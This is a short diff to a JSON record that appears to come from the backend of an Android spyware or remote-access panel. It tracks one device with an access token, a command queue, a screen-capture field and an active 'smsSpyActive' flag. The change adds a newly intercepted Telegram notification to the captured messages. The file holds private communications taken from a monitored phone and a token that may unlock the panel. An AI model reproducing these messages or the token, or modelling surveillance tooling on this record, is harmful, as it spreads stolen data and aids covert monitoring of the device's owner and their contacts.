@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777066807651,
+    "lastSeen": 1777066813699,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5720 pesan baru dari 51 obrolan",
+        "time": "25/04 04:40",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777066815467
+      },
       {
         "appName": "Telegram",
         "sender": "BOT GACHA ITEM VIP",
